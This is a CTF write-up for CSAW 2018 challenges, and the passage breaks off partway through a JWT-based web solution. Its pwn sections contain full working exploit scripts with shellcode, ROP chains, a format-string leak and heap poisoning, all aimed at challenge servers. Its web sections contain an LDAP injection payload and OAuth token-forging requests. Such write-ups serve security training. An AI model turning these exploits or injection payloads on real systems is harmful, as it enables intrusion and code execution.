**Solution** (by [Mem2019](https://github.com/Mem2019))

stack overflow to change the return address to the shell function

## 100 Pwn / shell->code ##

**Description**

> Linked lists are great! They let you chain pieces of data together.
> 
> `nc pwn.chal.csaw.io 9005`

**Files provided**

 - [`shellpointcode`](files/shellpointcode)

**Solution** (by [Mem2019](https://github.com/Mem2019))
put `/bin/sh\x00` into node 1, and put shellcode 

```assembly
add esp,0x30
xor rdx,rdx
xor rsi,rsi
push SYS_execve
pop rax
syscall
```
```python
from pwn import *
g_local=True
context.log_level='debug'
if g_local:
	sh = process('./shellpointcode')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("pwn.chal.csaw.io", 9005)
shellcode = "lea rdi,[rsp+0x28]\nxor rdx,rdx\nxor rsi,rsi"
sh.recvuntil("(15 bytes) Text for node 1:  \n")
sh.send("/bin/sh\x00\n")
sh.recvuntil("(15 bytes) Text for node 2: \n")
sh.send("A" * 5 + asm("\npush SYS_execve\npop rax\nsyscall", arch='amd64')  + "\n")
sh.recvuntil("node.next: 0x")
leak = sh.recv(6*2)
ret_addr = int(leak, 16)
sh.recvuntil("What are your initials?\n")
sh.send("A" * (3+8) + p64(ret_addr) + asm(shellcode, arch='amd64') + "\xeb\n")
sh.interactive()
```
to node 2 and initials

bacause the memory layout, is initials, node 2, node 1, from low address to high address

## 200 Pwn / doubletrouble ##

**Description**

> Did you know every Number in javascript is a float
> 
> `pwn.chal.csaw.io:9002`
> 
> nsnc

**Files provided**

 - [`doubletrouble`](files/doubletrouble)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The problem is the total length will increase in `find_array`

```c
int __cdecl findArray(int *a1, double *a2, double a3, double a4)
{
  int v5; // [esp+1Ch] [ebp-4h]

  v5 = *a1;
  while ( *a1 < 2 * v5 )
  {
    if ( a2[*a1 - v5] > (long double)a3 && a4 > (long double)a2[*a1 - v5] )
      return *a1 - v5;
    ++*a1;
  }
  *a1 = v5;
  return 0;
}
```

Then it will sort according to the increased size, which can affect return address.

However, there is canary, so we need to let the canary stay at the same position after sorting, with return address being changed.

What I've chosen is to set it as `leave ret`, and pivot the stack into our double array, then execute `retn` to execute our shellcode in the form of IEEE double. Also, the shellcode must be sorted, which can be implemented by manipulating the exponential part of IEEE double, while the digits are our shellcode with `jmp short`.

This takes me a lot of time, and we need to execute `/bin/sh` instead of `/bin/csh` as it suggested in the strings in the executable. Also, since canary is random, we cannot be sure about the position of canary after sorting, so my approach gives about `1/40` probability.

//todo, more detailed illustration later

```python
from pwn import *
import struct
g_local=False
context.log_level='debug'


LEAVE_RET = 0x08049166
DOUBLE_OFF = 0
def to_double(num):
	return struct.unpack('<d', p64(num))[0]

def make_ieee_double(exp, digit, sign = 1):
	assert sign == 1 or sign == 0
	assert digit >= 0 and digit < (1 << 52)
	rexp = exp + 1023
	assert rexp >= 0 or rexp < 2048
	return to_double((sign << 63) + (rexp << 52) + digit)

def shellcodes_4(asmcode):
	ret = asm(asmcode)
	assert len(ret) <= 4
	return u64(ret.ljust(4, "\x90") + '\xeb\x02\x00\x00')

def make_shellcode(shpath):
	assert len(shpath) % 4 == 0
	ret = []
	e = 1000
	#0x804A127
	for x in range(0, len(shpath), 4)[::-1]:
		ret.append(make_ieee_double(e, shellcodes_4("mov ax," + hex(u16(shpath[x+2:x+4])))))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("shl eax,16")))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("mov ax," + hex(u16(shpath[x:x+2])))))
		e -= 1
		ret.append(make_ieee_double(e, shellcodes_4("push eax")))
		e -= 1
	#0x804BFF0
	ret.append(make_ieee_double(e, shellcodes_4("push esp")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov ax,0x804")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("shl eax,16")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov ax,0xBFF0")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("mov eax,[eax]")))
	e -= 1
	ret.append(make_ieee_double(e, shellcodes_4("call eax")))
	return ret

def exploit():
	if g_local:
		sh = process('./doubletrouble')#env={'LD_PRELOAD':'./libc.so.6'}
		shstr = "/bin/sh\x00"
		gdb.attach(sh)
	else:
		sh = remote("pwn.chal.csaw.io", 9002)
		shstr = "/bin/sh\x00"
	sh.recvuntil("0x")
	leak = int(sh.recv(8),16)
	arr = leak + DOUBLE_OFF
	smallest = make_ieee_double(1020, arr + 0x20)
	bigger = make_ieee_double(800, 0xdeadbeef)

	payload = [smallest] * 4 + [-50.0] + [to_double((LEAVE_RET << 32) + arr - 4)] * 2 + make_shellcode(shstr)
	payload += [bigger] * (64-len(payload))
	assert len(payload) == 64
	sh.recvuntil("How long: ")
	sh.send(str(len(payload)) + "\n")
	for n in payload:
		sh.recvuntil("Give me: ")
		sh.send(repr(n) + "\n")
	sh.recvuntil("Sorted Array:")
	ret = sh.recvuntil("terminated\r\n", timeout = 3.0)
	if ret == '':
		sh.interactive()
	else:
		return sh

while True:
	try:
		exploit().close()
	except Exception as e:
		print "failed"
```

## 250 Pwn / turtles ##

**Description**

> Looks like you found a bunch of turtles but their shells are nowhere to be seen! Think you can make a shell for them?
> 
> `nc pwn.chal.csaw.io 9003`
> 
> Update (09/14 6:25 PM) - Added libs.zip with the libraries for the challenge

**Files provided**

 - [turtles](files/turtles)
 - [libs.zip](https://ctf.csaw.io/files/f8d7ea4fde01101de29de49d91434a5a/libs.zip) (too large to host)

**Solution** (by [Mem2019](https://github.com/Mem2019))

After reversing function `objc_msg_lookup`, we found that if we satisfy some conditions, we can manipulate the return value, which will be called, and then we can do ROP, because we can control the buffer on stack. What I did is to switch the stack to heap to do further exploitation.

Firstly, leak the `libc` address and return to main function, then do the same thing again to execute `system("/bin/sh")`

exp

```python
from pwn import *

g_local=False
context.log_level='debug'

e = ELF("./libc-2.19.so")
p = ELF("./turtles")
if g_local:
	sh = remote("192.168.106.151", 9999)#env={'LD_PRELOAD':'./libc.so.6'}
else:
	sh = remote("pwn.chal.csaw.io", 9003)
	#ONE_GADGET_OFF = 0x4557a

LEAVE_RET = 0x400b82
POP_RDI_RET = 0x400d43
#rop = 'A' * 0x80
rop = p64(POP_RDI_RET)
rop += p64(p.got["printf"])
rop += p64(p.plt["printf"])
rop += p64(0x400B84) #main

sh.recvuntil("Here is a Turtle: 0x")
leak = sh.recvuntil("\n")
obj_addr = int(leak, 16)

rop_pivot = p64(0x400ac0) #pop rbp ret
rop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)
rop_pivot += p64(LEAVE_RET) + p64(0)

fake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)
fake_turtle += rop_pivot
# different when dynamic
# fake_turtle += p64(0x601400) + p64(0x601328)
# fake_turtle += p64(0x601321) + p64(0)
# fake_turtle += p64(1) + p64(8)
# fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x80)
# fake_turtle += 8 * p64(0)
# #------------------
# fake_turtle += p64(0) + p64(1)
# fake_turtle += p64(0x601331) + p64(0x601349)
# fake_turtle += p64(0x400d3c) #pop 5 ret
# fake_turtle += 3 * p64(0)

fake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)
#----------------
fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret
fake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret
fake_turtle += 'a' * 8 + rop
sh.interactive()
sh.send(fake_turtle)
libc_addr = u64(sh.recvuntil("\x7f") + "\x00\x00") - e.symbols["printf"]
print hex(libc_addr)

sh.recvuntil("Here is a Turtle: 0x")
leak = sh.recvuntil("\n")
obj_addr = int(leak, 16)

rop_pivot = p64(0x400ac0) #pop rbp ret
rop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)
rop_pivot += p64(LEAVE_RET) + p64(0)

fake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)
fake_turtle += rop_pivot
fake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)
#----------------
fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret
fake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret
fake_turtle += 'a' * 8 + p64(POP_RDI_RET) + p64(libc_addr + next(e.search('/bin/sh\x00')))
fake_turtle += p64(libc_addr + e.symbols["system"]) #0x30 one_gadget

sh.send(fake_turtle)

sh.interactive()
```

//todo

## 300 Pwn / PLC ##

**Description**

> We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines.
> 
> You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge
> 
> NOTE The wargames platform is out of scope for this challenge, just use it to do the pwnable challenge. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`

**No files provided**

**Solution** (by [Mem2019](https://github.com/Mem2019))

1. use `x` command to dump the binary, so that we can cheat using IDA.
2. after some reversing, we found that there is overflow and no null termination when we fill `enrichment` string
3. There is a function pointer just after it, which should point to `sub_AB0`, we can leak pie first
4. then after some debugging, we know that when we call that function pointer, the `rdi` points to `enrichment`
5. change that function to `printf`, so we can leak the `libc` address
6. then change it to a ROP gadget, which can let the program go to our ROP chain, 
7. because there is a 128-length buffer that we can control in stack
8. use return to syscall using gadgets in libc, since the original `execve` is disabled

```python
import interact
sh = interact.Process()

def u16(st):
	assert len(st) == 2
	return ord(st[0]) + (ord(st[1]) << 8)

def p16(num):
	return chr(num & 0xff) + chr((num >> 8) & 0xff)

def u64(st):
	return u16(st[0:2]) + (u16(st[2:4]) << 0x10) + (u16(st[4:6]) << 0x20) + (u16(st[6:8]) << 0x30)

def p64(num):
	return p16(num & 0xffff) + p16((num >> 0x10) & 0xffff) + p16((num >> 0x20) & 0xffff) + p16((num >> 0x30) & 0xffff)

def checksum(codes):
	codes_len = 1020
	assert len(codes) == codes_len
	acc = 0
	k = 2
	for i in xrange(0, codes_len, 2):
		acc = u16(codes[i:i+2]) ^ ((k + (((acc << 12) & 0xffff) | (acc >> 4))) & 0xffff)
		k += 1
	return acc

def make_fw(codes):
	codes = "19" + codes
	cs = checksum(codes)
	ret = "FW" + p16(cs) + codes
	assert len(ret) == 0x400
	return ret

def update(codes):
	sh.send("U\n")
	sh.send(make_fw(codes.ljust(1018,"\x00")))

def execute(payload = '', leak = False):
	sh.send("E".ljust(8,'\x00') + payload + "\n") #at 11$
	if leak:
		sh.readuntil("2019")
		return sh.readuntil("\x7f")

def status():
	sh.send("S\n")
	print sh.readuntil("ENRICHMENT MATERIAL: " + 'A' * 68)
	ret = sh.readuntil("\n")
	ret = ret[:len(ret)-1]
	return ret

def make_payload(st):
	ret = ""
	for c in st:
		ret += '2'
		ret += c
	return ret

def make_format(fmt):
	return make_payload("2019" + fmt + "A" * (64-len(fmt)) + p64(prog_addr + 0x900)) #printf

print sh.readuntil("- - - - - - - - - - - - - - - - - - - - \n")
print sh.readuntil("- - - - - - - - - - - - - - - - - - - - \n")
#update("7" * 70 + "31" + "21" * 0x100 + "9")
update("2A" * 68 + "9")
execute()

prog_addr = (u64(status() + "\x00\x00") - 0xAB0)
print hex(prog_addr)
trigger = "7" * 70 + "31" + "9"
update(make_format("%11$s") + trigger)
leak = execute(p64(prog_addr + 0x202018), True) #puts

libc_addr = u64(leak + "\x00\x00") - 0x6f690
print hex(libc_addr)

rop_start = libc_addr + 0x10a407 # add rsp, 0x40 ; ret
pop_rax_ret = libc_addr + 0x33544
pop_rdi_ret = libc_addr + 0x21102
pop_rsi_ret = libc_addr + 0x202e8
pop_rdx_ret = libc_addr + 0x1b92

rop = p64(pop_rax_ret) + '\x3b'.ljust(8, '\x00')# bug? p64(59) #execve 
rop += p64(pop_rdi_ret) + p64(libc_addr + 0x18CD57) #/bin/sh
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(pop_rdx_ret) + p64(0)
rop += p64(libc_addr + 0xF725E) #syscall

update(make_payload("2019" + "A" * 64 + p64(rop_start)) + trigger)
execute('A' * 0x10 + rop)

sh.interactive()
```

## 400 Pwn / alien invasion ##

**Description**

> Construct additional pylons
> 
> `nc pwn.chal.csaw.io 9004`
> 
> Binary updated: 8:17 AM Sat
> 
> Libc updated: 4:09 PM Sat

**Files provided**

 - [`aliensVSsamurais`](files/alien-invasion-aliensVSsamurais)
 - [`libc-2.23.so`](files/alien-invasion-libc-2.23.so)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The sumurai part seems to be unexploitable, but there is a null byte off-by-one when we call `new_alien`

```c
v0->name[(signed int)read(0, v0->name, size)] = 0; // off by one
v1 = alien_index++;
```

so we can use null byte poisoning to do it, however, we cannot write `__malloc_hook` or `__free_hook`, but there is a pointer in the alien structure, and we can show and edit it. Thus, we can use it to leak the stack address using `environ` in libc, and then write the return address of `hatchery` to `one_gadget` with the zero precondition.

The other parts seems to be not useful, although there are many problems in this binary. However, these problems are unexploitable or hard to exploit.

exp

```python
from pwn import *

g_local=True
context.log_level='debug'

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./aliensVSsamurais')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	gdb.attach(sh)
else:
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	sh = remote("pwn.chal.csaw.io", 9004)
	e = ELF("./libc.so.6")
	#ONE_GADGET_OFF = 0x4557a

def create(length, content):
	sh.send("1\n")
	sh.recvuntil("How long is my name?\n")
	sh.send(str(length) + "\n")
	sh.recvuntil("What is my name?\n")
	sh.send(content)
	sh.recvuntil("Brood mother, what tasks do we have today.\n")

def delete(idx):
	sh.send("2\n")
	sh.recvuntil("Which alien is unsatisfactory, brood mother?\n")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Brood mother, what tasks do we have today.\n")

def editidx(idx, content = None):
	sh.send("3\n")
	sh.recvuntil("Brood mother, which one of my babies would you like to rename?\n")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Oh great what would you like to rename ")
	ret = sh.recvuntil(" to?\n")
	ret = ret[:len(ret)-len(" to?\n")]
	if content:
		sh.send(content)
	else:
		sh.send(ret)
	sh.recvuntil("Brood mother, what tasks do we have today.\n")
	return ret

sh.recvuntil("Daimyo, nani o shitaidesu ka?\n")
sh.send("1\n")
sh.recvuntil("What is my weapon's name?\n")
sh.send("1\n")
sh.recvuntil("Daimyo, nani o shitaidesu ka?\n")
sh.send("3\n")
#use samurai to put malloc hook to 0

sh.recvuntil("Brood mother, what tasks do we have today.\n")
create(0x10, "fastbin") #0
create(0x10, "fastbin") #1
delete(0)
delete(1)
#prepare some 0x20 fastbin

create(0x210, "a") #2
create(0x100, "c") #3
create(0x100, "padding") #4

delete(2)
create(0x108, "a" * 0x108) #5
#0x111 -> 0x100
#0x20 fastbin *1

create(0x80, "b1") #6
create(0x100 - 0x90 - 0x20 - 0x10, "b2b2b2b2b2b2b2b2") #7

delete(6)
delete(3)
#0x221 unsorted bin
#0x20 *2

create(0xa0, "consume unsorted + leak") # 8
libc_addr = u64(editidx(7) + "\x00\x00") - UNSORTED_OFF
print hex(libc_addr)
delete(8)
#recover to 0x221 unsorted bin
#0x20 *2

create(0xa0, "A" * 0x88 + p64(0x21) + p64(libc_addr + e.symbols["environ"]) + p64(0xdeadbeef)) # 9
stack_addr = u64(editidx(7) + "\x00\x00")
print hex(stack_addr)
delete(9)
#leak = 0xe58

#0xd48 -> one_gadget 0x30
create(0xa0, "A" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd48) + p64(0xdeadbeef)) # 10
editidx(7, p64(libc_addr + ONE_GADGET_OFF))
delete(10)


#0xd80 -> 0
create(0xa0, "A" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd80) + p64(0xdeadbeef)) # 11
editidx(7, p64(0))
delete(11)

sh.interactive()
```

## 50 Reversing / A Tour of x86 - Part 1 ##

**Description**

> Newbs only!
> 
> `nc rev.chal.csaw.io 9003`
> 
> -Elyk
> 
> Edit (09/15 12:30 AM) - Uploaded new stage-2.bin to make Part 2 easier.

**Files provided**

 - [`stage-1.asm`](files/x86-1-stage-1.asm)
 - [`Makefile`](files/x86-1-Makefile)
 - [`stage-2.bin`](files/x86-1-stage-2.bin)

**Solution**

(TODO)

## 100 Reversing / A Tour of x86 - Part 2 ##

**Description**

> Open stage2 in a disassembler, and figure out how to jump to the rest of the code!
> 
> -Elyk
> 
> Edit (09/15 12:30 AM) - Uploaded new stage-2.bin to make the challenge easier

**Files provided**

 - [`stage-1.asm`](files/x86-1-stage-1.asm)
 - [`Makefile`](files/x86-1-Makefile)
 - [`stage-2.bin`](files/x86-1-stage-2.bin)

**Solution**

(TODO)

## 200 Reversing / A Tour of x86 - Part 3 ##

**Description**

> The final boss!
> 
> Time to pull together your knowledge of Bash, Python, and stupidly-low-level assembly!!
> 
> This time you have to write some assembly that we're going to run.. You'll see the output of your code through VNC for 60 seconds.
> 
> Objective: Print the flag.
> 
> What to know:
> 
> Strings need to be alternating between the character you want to print and '0x1f'.
> 
> To print a string you need to write those alternating bytes to the frame buffer (starting at 0x00b8000...just do it). Increment your pointer to move through this buffer.
> 
> If you're having difficulty figuring out where the flag is stored in memory, this code snippet might help you out:
> 
>     get_ip:
>       call next_line
>       next_line:
>       pop rax
>     ret
> 
> That'll put the address of `pop rax` into rax.
> 
> Call serves as an alias for `push rip` (the instruction pointer - where we are in code) followed by `jmp _____` where whatever is next to the call fills in the blank.
> 
> And in case this comes up, you shouldn't need to know where you are loaded in memory if you use that above snippet...
> 
> Happy Reversing!!
> 
> `nc rev.chal.csaw.io 9004`
> 
> - Elyk
> 
> Edit (09/16 1:13 AM) - Uploaded new files. No change in challenge difficulty or progression, simply streamlining the build process.

**Files provided**

 - [`Makefile`](files/x86-3-Makefile)
 - [`part-3-server.py`](files/x86-3-part-3-server.py)
 - [`tacOS-base.bin`](files/x86-3-tacOS-base.bin)

**Solution**

From the `part-3-server.py` script we can see what happens on connection – we provide the hexdump for our assembly code, it gets linked with the previous stages and executed on a VNC. What is most important, however, is that the flag is added to the end of our code.

So we simply need to read the flag from after our location in memory (related to the `rip` register, hence the snippet in the description), and write it to the screen. `0x000b8000` is a special location in memory – it is mapped directly to text display in protected mode. We write the character values in even positions in the memory, and we write background / foreground colour settings in odd positions in the memory.

```asm
bits 32

part3:
  mov esi, 0x000b8000   ; video memory location
  call get_ip           ; = mov ebx, (position of pop ebx in get_ip)
  mov edx, 512          ; read 512 characters
._mov_loop:
  cmp edx, 0
  jz .end               ; jump to .end if done
  sub edx, 1
  mov ecx, [ebx]        ; read a character from memory
  mov byte [esi], cl    ; move it into video memory
  add esi, 1
  mov byte [esi], 0x1F  ; white-on-blue text
  add esi, 1
  add ebx, 1
  jmp ._mov_loop
.end:
  jmp .end              ; infinite loop to keep the VNC running

get_ip:
  call next_line
next_line:
  pop ebx
  ret
```

`flag{S4l1y_Se11S_tacOShell_c0d3_bY_tHe_Se4_Sh0re}`

## 500 Reversing / kvm ##

**Description**

> We found a mysterious program that none of our most talented hackers could even begin to figure out.
> 
> Author: toshi

**Files provided**

 - [`challenge`](files/kvm-challenge)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The OS is obsfucated by using `hlt` instruction to implement the conditional or unconditional `jmp`, so we can patch it first

```python
hlt_tab = {0xc50b6060 : 0x454,
0x9d1fe433 : 0x3ed,
0x54a15b03 : 0x376,
0x8f6e2804 : 0x422,
0x8aeef509 : 0x389,
0x3493310d : 0x32c,
0x59c33d0f : 0x3e1,
0x968630d0 : 0x400,
0xef5bdd13 : 0x435,
0x64d8a529 : 0x3b8,
0x5f291a64 : 0x441,
0x5de72dd : 0x347,
0xfc2ff49f : 0x3ce}
text_end = 0x611
def replace_jmps(start,end):
	for p in xrange(start,end):
		if Byte(p) == 0xB8 and Byte(p + 5) == 0xF4 and Dword(p + 1) in hlt_tab:
			jmp_addr = hlt_tab[Dword(p + 1)]
			PatchByte(p, 0xE9)
			PatchDword(p + 1, (jmp_addr - (p + 5)) & 0xffffffff)
			PatchByte(p + 5, 0x90)
		#Patch to hlt to jmp
```

There are only 4 conditional `jmp`, so analyze them by hand. Also, edit the function to extend it, so that the analysis in IDA will be easier.

After some reversing, we found that the program is a Huffman Tree. It will encode the input into the path going from root node to the corresponding leaf node, but in reversed order(which makes decoding very hard, since the ambiguity exists).

I got stucked in the algorithm for 3 hours, will add more details later if I have time.

```python
ROOT_OFF = 0x1300
def MyQword(addr):
	ret = Qword(addr)
	if ret == 0xFFFFFFFFFFFFFFFF:
		return 0
	else:
		return ret
def MyByte(addr):
	ret = Byte(addr)
	if ret == 0xFF:
		return 0
	else:
		return ret

#dfs to get the mapping
def get_path_to_char(node):
	if MyQword(node) != 0xFF:
		return [([],chr(MyQword(node)))]
	right = MyQword(node + 0x10)
	left = MyQword(node + 8)
	ret = []
	lmap = get_path_to_char(left)
	for (p, c) in lmap:
		ret.append((p + [0], c))
	rmap = get_path_to_char(right)
	for (p, c) in rmap:
		ret.append((p + [1], c))
	return ret

def begin_with(l, sl):
	if len(sl) > len(l):
		return False
	for i in xrange(0, len(sl)):
		if l[i] != sl[i]:
			return False
	return True
# recursion too long!!!
# #return lsit of strings of possibilities
# def get_all_poss(bits, mapping, pad):
# 	poss = []
# 	for (p,c) in mapping:
# 		if begin_with(bits, p):
# 			poss.append((len(p), c))
# 	ret = []
# 	for x in poss:
# 		#print poss
# 		print pad * ' ' + x[1]
# 		ret += map(lambda st : x[1] + st, get_all_poss(bits[x[0]:], mapping, pad + 1))
# 	#print ret
# 	return ret

#return lsit of strings of possibilities
def get_all_poss(obits, mapping, pad):
	live_bits = [("",obits)]
	while len(live_bits) != 1 or len(live_bits[0][1]) != 0:
		(parsed,bits) = live_bits.pop()
		poss = []
		for (p,c) in mapping:
			if begin_with(bits, p):
				poss.append((len(p), c))
		#get all poss
		for x in poss:
			#print x
			live_bits.append((parsed + x[1],bits[x[0]:]))
		#if len(live_bits) == 1:
		print live_bits
	return live_bits

def recover(data):
	ret = []
	bits = []
	for x in data:
		for i in range(0,8):
			if x & (1 << i) != 0:
				bits.append(1)
			else:
				bits.append(0)
	print bits
	mapping = get_path_to_char(ROOT_OFF)
	#while len(bits) > 0: loop does not work well for ambiguoutyt
	ret = get_all_poss(bits, mapping, 0)
	return ret

# fails because it is in reverse order
# def recover(data):
# 	ret = []
# 	cur_node = ROOT_OFF
# 	for x in data:
# 		for i in range(0,8)[::-1]:
# 			print hex(cur_node)
# 			if x & (1 << i) != 0: #r
# 				cur_node = MyQword(cur_node + 0x10)
# 			else:
# 				cur_node = MyQword(cur_node + 8)
# 			if MyQword(cur_node) != 0xff:
# 				ret.append(MyQword(cur_node))
# 				cur_node = ROOT_OFF
# 	return ret
```

Even in the end I did not get the original input, but I've already got the flag, which is part of the input.

## 50 Web / Ldab ##

**Description**

> _dab_
> 
> `http://web.chal.csaw.io:8080`

**No files provided**

**Solution**

We can see a directory of users:

![](screens/ldab.png)

The weird column names and the title of the challenge can quickly lead us to finding out about Lightweight Directory Access Protocol (LDAP). More specifically, [LDAP filters](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol#Search_and_Compare) and even better - [LDAP injection](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_%28OTG-INPVAL-006%29).

A simple way to verify if the page is vulnerable is with test strings like `*` (should show all users), `Pete*` / `P*te` (should show Pete), before moving on to injections with `(` and `)`.

The page always shows results with `OU` (object class?) value of `Employees`, and whatever we type into the search box must match the `GivenName` column. Presumably there is an entry in the database that never shows up, which will contain the flag itself. This is the filter used (shamelessly stolen from the source):

    filter: (&(objectClass=person)(&(givenName=<input>)(!(givenName=Flag))))
    intended meaning:
      (objectClass is person)
      AND
      (
        (givenName is <input>)
        AND
        NOT(givenName is Flag)
      )

We can verify this is the case without much damage (yet):

    input:  *)(givenName=Pete
    filter: (&(objectClass=person)(&(givenName=*)(givenName=Pete)(!(givenName=Flag))))
    meaning:
      (objectClass is person)
      AND
      (
        (givenName is any)
        AND
        (givenName is Pete)
        AND
        NOT(givenName is Flag)
      )

And indeed, only Pete shows up. Let's try a proper injection:

    input:  *))(|(objectClass=*
    filter: (&(objectClass=person)(&(givenName=*))(|(objectClass=*)(!(givenName=Flag))))
    meaning:
      (objectClass is person)
      AND
      (
        (givenName is any)
      )
      AND
      (
        (objectClass is ANY)
        OR
        NOT(givenName is Flag)
      )

As you can see, the flag exclusion mechanism became optional (either the entry is not the flag OR its object class is any, which is always true). And with that, we can see the flag:

`flag{ld4p_inj3ction_i5_a_th1ng}`

## 100 Web / sso ##

**Description**

> Don't you love undocumented APIs
> 
> Be the `admin` you were always meant to be
> 
> http://web.chal.csaw.io:9000
> 
> Update chal description at: 4:38 to include solve details
> 
> Aesthetic update for chal at Sun 7:25 AM

**No files provided**

**Solution**

We start at a rather empty website.

```html
<h1>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</h1>
<a href="/protected">.</a>
<!--
Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess
POST /oauth2/token
POST /oauth2/authorize form-data TODO: make a form for this route
-->
```

Trying to go to `/protected` results in the page telling us:

    Missing header: Authorization

If we try to do a `POST` request to the two URLs given in the comment:

    $ curl -X POST http://web.chal.csaw.io:9000/oauth2/token
    incorrect grant_type
    $ curl -X POST http://web.chal.csaw.io:9000/oauth2/authorize
    response_type not code

OAuth 2.0 is a very widespread mechanism for logins and registrations. It is quite easy to find articles referencing how it works, and both `grant_type` and `response_type`. [Here](https://alexbilbie.com/guide-to-oauth-2-grants/) is a good one.

So, our first step is to make a POST request to the authorisation server, which is represented by the `/oauth2/authorize` URL in our case:

    $ curl -X POST -d "response_type=code" \
      -d "client_id=admin" \
      --data-urlencode "redirect_uri=http://web.chal.csaw.io:9000/protected" \
      -d "state=admin" \
      -d "scope=admin" \
      "http://web.chal.csaw.io:9000/oauth2/authorize"
    Redirecting to <a href="http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I&amp;state=admin">http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I&amp;state=admin</a>

The `code` URL in the above gives us a token which we then submit to the `/oauth2/token` URL:

    $ curl -X POST -d "grant_type=authorization_code" \
      -d "client_id=admin" \
      -d "client_secret=admin" \
      --data-urlencode "redirect_uri=http://web.chal.csaw.io:9000/protected" \
      -d "code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I" \
      "http://web.chal.csaw.io:9000/oauth2/token"
    {"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ.4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk"}

And with this token we can try to go to `/protected`!

    $ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ.4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk" \
      "http://web.chal.csaw.io:9000/protected"
    You must be admin to access this resource

But of course, that would have been too simple. Even though we put `admin` in basically all the parameters, we are not admins to the server. Let's have a look at the token though. It seems to be a couple of Base64-encoded strings:

    $ printf "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -D
    {"alg":"HS256","typ":"JWT"}
    $ printf "eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ==" | base64 -D
    {"type":"user","secret":"ufoundme!","iat":1537298018,"exp":1537298618}
    $ printf "4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk=" | base64 -D | xxd
    0000000: e075 87a3 5768 4e05 9e8e bfa3 4d37 5e62  .u..WhN.....M7^b
    0000010: 814c 2a9b a22e f4fd f88d e34a eb21 90d9  .L*........J.!..

